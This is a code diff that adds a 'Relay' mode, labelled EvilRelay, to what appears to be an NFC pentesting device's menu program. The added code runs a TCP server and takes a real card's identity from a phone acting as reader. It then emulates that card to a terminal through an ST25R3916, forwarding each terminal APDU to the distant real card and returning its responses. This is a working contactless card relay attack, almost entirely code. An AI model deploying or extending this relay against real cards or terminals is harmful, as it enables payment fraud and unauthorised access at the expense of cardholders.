@@ -16,6 +16,7 @@ import os
 import sys
 import json
 import time
+import socket
 
 sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
 
@@ -71,6 +72,8 @@ _ICON_TIMES   = ""
 _ICON_LOCK    = ""
 _ICON_UNLOCK  = ""
 
+_ICON_RELAY = _ICON_EMULATE  # relay is an emulation variant; reuse the glyph
+
 MENU_ITEMS = [
     ("Read",    _ICON_READ),
     ("Saved",   _ICON_SAVED),
@@ -78,7 +81,16 @@ MENU_ITEMS = [
     ("EMV",     _ICON_EMV),
     ("Write",   _ICON_WRITE),
     ("NDEF",    _ICON_NFC),
+    ("Relay",   _ICON_RELAY),
 ]
+
+# ── EvilRelay transport (RaspyJack = ISO-DEP emulator, TCP server) ─────
+# Frame: [0x5A][type][seq][lenHi][lenLo][payload]
+#   type 1 IDENT  reader->emulator : uidLen uid.. atqa0 atqa1 sak atsLen ats..
+#   type 2 REQ    emulator->reader : APDU from the terminal
+#   type 3 RESP   reader->emulator : card response
+RELAY_PORT  = 5566
+RELAY_MAGIC = 0x5A
 
 _lcd = None
 _last_btn = 0
@@ -1275,6 +1287,220 @@ def _write_ndef_to_tag(ndef_record):
 
 # ── Main Menu ────────────────────────────────────────────────────────
 
+# ── Relay Mode (EvilRelay emulator: TCP server + ISO-DEP target) ──────
+
+def _relay_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    except Exception:
+        return "0.0.0.0"
+    finally:
+        s.close()
+
+
+def _relay_recv_n(sock, n):
+    buf = bytearray()
+    while len(buf) < n:
+        try:
+            chunk = sock.recv(n - len(buf))
+        except Exception:
+            return None
+        if not chunk:
+            return None
+        buf += chunk
+    return bytes(buf)
+
+
+def _relay_read_frame(sock):
+    """Read one [0x5A][type][seq][lenHi][lenLo][payload] frame -> (type, seq, payload)."""
+    hdr = _relay_recv_n(sock, 5)
+    if not hdr or hdr[0] != RELAY_MAGIC:
+        return None
+    ln = (hdr[3] << 8) | hdr[4]
+    payload = _relay_recv_n(sock, ln) if ln else b""
+    if payload is None:
+        return None
+    return (hdr[1], hdr[2], payload)
+
+
+def _relay_send_frame(sock, typ, seq, payload):
+    ln = len(payload)
+    hdr = bytes([RELAY_MAGIC, typ & 0xFF, seq & 0xFF, (ln >> 8) & 0xFF, ln & 0xFF])
+    sock.sendall(hdr + payload)
+
+
+def _relay_draw(status, color, lines, count=None):
+    img = _new_img()
+    d = _draw(img)
+    _draw_header(d, "NFC Relay", right=(str(count) if count is not None else ""),
+                 icon=_ICON_RELAY)
+    y = HDR_H + 6
+    d.text((PAD, y), status, font=FONT_LG if IS_WIDE else FONT, fill=color)
+    y += (20 if IS_WIDE else 14)
+    for ln in lines:
+        d.text((PAD, y), ln, font=FONT_SM if IS_WIDE else FONT_XS, fill=C_DIM)
+        y += (14 if IS_WIDE else 10)
+    _draw_footer(d, "K3:Stop")
+    _show(img)
+
+
+def _mode_relay():
+    """EvilRelay emulator role: the ST25R3916 presents a remote card to a terminal.
+
+    A phone running EvilRelay in *Reader* mode (TCP client) connects to this
+    RaspyJack on port 5566, sends the real card's identity (IDENT), then relays
+    each terminal APDU to the real card and returns its response.
+    """
+    ip = _relay_local_ip()
+
+    # 1) Listen for the reader (phone) on the LAN.
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        srv.bind(("0.0.0.0", RELAY_PORT))
+        srv.listen(1)
+    except Exception as e:
+        _draw_msg("Bind failed", str(e)[:22], color=C_RED, icon=_ICON_TIMES)
+        srv.close()
+        time.sleep(2.0)
+        return
+    srv.settimeout(0.3)
+
+    _relay_draw("Waiting reader", C_ORANGE,
+                [f"Listen {ip}:{RELAY_PORT}", "Phone: Reader mode", "aim this IP"])
+
+    client = None
+    while client is None:
+        if _btn() == "KEY3":
+            srv.close()
+            return
+        try:
+            client, addr = srv.accept()
+        except socket.timeout:
+            continue
+        except Exception:
+            srv.close()
+            return
+    srv.close()
+    client.settimeout(8.0)
+
+    # 2) First frame must be IDENT (type 1): the real card's identity.
+    try:
+        frame = _relay_read_frame(client)
+    except Exception:
+        frame = None
+    if not frame or frame[0] != 1 or len(frame[2]) < 4:
+        _draw_msg("No IDENT", "reader link failed", color=C_RED, icon=_ICON_TIMES)
+        _safe_close(None)
+        try:
+            client.close()
+        except Exception:
+            pass
+        time.sleep(2.0)
+        return
+
+    # Parse IDENT: uidLen uid.. atqa0 atqa1 sak atsLen ats..
+    p = frame[2]
+    try:
+        ul = p[0]
+        uid = p[1:1 + ul]
+        off = 1 + ul
+        atqa = p[off] | (p[off + 1] << 8)
+        sak = p[off + 2]
+        al = p[off + 3]
+        ats = p[off + 4:off + 4 + al]
+    except Exception:
+        _draw_msg("Bad IDENT", "parse error", color=C_RED, icon=_ICON_TIMES)
+        try:
+            client.close()
+        except Exception:
+            pass
+        time.sleep(2.0)
+        return
+
+    uid_str = "".join("%02X" % b for b in uid)
+    _relay_draw("Reader linked", C_GREEN,
+                [f"UID {uid_str}", "SAK %02X  ATS %dB" % (sak, len(ats)),
+                 "Tap the terminal"], count=0)
+
+    # 3) Open the ST25R3916 and run the ISO-DEP target relay.
+    drv = _open_driver()
+    if not drv:
+        _draw_msg("No Cap HAT", "ST25R3916 open failed", color=C_RED, icon=_ICON_TIMES)
+        try:
+            client.close()
+        except Exception:
+            pass
+        time.sleep(2.0)
+        return
+
+    seq = {"n": 0}
+
+    def apdu_cb(apdu):
+        # Forward the terminal APDU to the phone (REQ) and await the card response (RESP).
+        try:
+            seq["n"] = (seq["n"] + 1) & 0xFF
+            _relay_send_frame(client, 2, seq["n"], apdu)
+            while True:
+                f = _relay_read_frame(client)
+                if f is None:
+                    return None
+                if f[0] == 3:
+                    return f[2]
+                # ignore any other frame type and keep waiting for RESP
+        except Exception:
+            return None
+
+    stats = {"count": 0, "status": "Emulating", "color": C_CYAN, "last": ""}
+
+    def on_event(ev):
+        st = ev.get("state")
+        if st == "rats":
+            stats["status"] = "Selected (ISO-DEP)"
+        elif st == "relayed":
+            stats["count"] = ev.get("count", stats["count"])
+            resp = ev.get("resp", b"")
+            sw = "".join("%02X" % b for b in resp[-2:]) if len(resp) >= 2 else "--"
+            stats["last"] = "APDU %dB->%dB SW%s" % (len(ev.get("apdu", b"")), len(resp), sw)
+            stats["status"] = "Relaying"
+            stats["color"] = C_GREEN
+        elif st == "deselect":
+            stats["status"] = "Deselected"
+            stats["color"] = C_ORANGE
+        elif st == "linklost":
+            stats["status"] = "Link lost"
+            stats["color"] = C_RED
+        _relay_draw(stats["status"], stats["color"],
+                    [f"UID {uid_str}", stats["last"] or "waiting terminal",
+                     "phone relay active"], count=stats["count"])
+
+    def should_stop():
+        return _btn() == "KEY3"
+
+    try:
+        from payloads._nfc_emulator import NFCEmulator
+        emu = NFCEmulator(drv)
+        emu.relay_iso_dep(uid, atqa, sak, ats, apdu_cb,
+                          on_event=on_event, should_stop=should_stop)
+    except Exception as e:
+        _draw_msg("Relay error", str(e)[:22], color=C_RED, icon=_ICON_TIMES)
+        time.sleep(2.0)
+    finally:
+        _safe_close(drv)
+        try:
+            client.close()
+        except Exception:
+            pass
+
+    _relay_draw("Session ended", C_CYAN,
+                [f"{stats['count']} APDU relayed", "K3 to return", ""],
+                count=stats["count"])
+    while _btn() != "KEY3":
+        time.sleep(0.05)
+
+
 def main():
     global _lcd, _running
     global FONT, FONT_SM, FONT_LG, FONT_XS, FONT_ICON, FONT_ICON_LG
@@ -1331,6 +1557,7 @@ def main():
                 {"Read": _mode_read, "Saved": _mode_saved,
                  "Emulate": _mode_emulate, "EMV": _mode_emv,
                  "Write": _mode_write, "NDEF": _mode_ndef,
+                 "Relay": _mode_relay,
                  }.get(label, lambda: None)()
 
             img = _new_img()
